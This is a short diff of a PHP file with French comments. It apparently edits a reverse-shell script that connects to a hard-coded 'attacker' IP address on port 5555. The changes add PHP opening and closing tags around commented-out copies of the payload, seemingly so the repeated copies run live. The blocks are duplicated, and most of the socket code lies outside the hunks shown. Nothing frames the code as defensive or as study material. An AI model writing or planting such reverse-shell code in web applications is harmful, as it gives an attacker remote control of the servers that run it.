@@ -1,4 +1,4 @@
-
+<?php
 // Remplacez l'adresse IP et le port par ceux de votre machine d'écoute.
 $ip = '84.6.222.90'; // Adresse IP de l'attaquant
 $port = 5555;          // Port d'écoute
@@ -12,7 +12,7 @@ if ($sock) {
     fclose($sock);
 } else {
     die('Impossible de se connecter au serveur.');
-}
+}?>
 -->
 // Remplacez l'adresse IP et le port par ceux de votre machine d'écoute.
 $ip = '84.6.222.90'; // Adresse IP de l'attaquant
@@ -49,7 +49,7 @@ if ($sock) {
     die('Impossible de se connecter au serveur.');
 }
 ?>
-<!--
+<!--<?php
 // Remplacez l'adresse IP et le port par ceux de votre machine d'écoute.
 $ip = '84.6.222.90'; // Adresse IP de l'attaquant
 $port = 5555;          // Port d'écoute
@@ -64,3 +64,4 @@ if ($sock) {
 } else {
     die('Impossible de se connecter au serveur.');
 }
+?>
